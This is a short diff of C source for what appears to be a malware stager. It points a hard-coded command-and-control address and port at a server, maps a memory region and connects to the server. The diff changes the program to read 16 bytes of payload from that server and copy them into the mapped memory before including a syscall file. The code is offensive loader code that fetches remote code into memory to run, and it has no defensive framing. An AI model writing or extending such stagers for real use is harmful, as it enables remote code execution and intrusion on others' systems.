@@ -6,11 +6,12 @@
 #define FLAGS (MAP_ANON|MAP_COPY)
 
 #define C2PORT 9000
-#define C2IP 16777343  // Because conversions are hard
+#define C2IP 0x020011ac  // Because conversions are hard
 
 int main() {
     // And now you can code in C
-    char * buf = mmap(STAGE, SIZE, PROTECTION, FLAGS, -1, 0);
+    char * mem = mmap(STAGE, SIZE, PROTECTION, FLAGS, -1, 0);
+    char buf[64] = {0};
 
     struct in_addr server_ip = { C2IP };
     struct sockaddr_in server = {
@@ -30,7 +31,8 @@ int main() {
         exit(errno);
     }
 
-    write(socket_fd, msg, 13);
+    read(socket_fd, buf, 16);
+    memcpy(mem, buf, 16);
 
     close(socket_fd);
     #include "syscall.c"
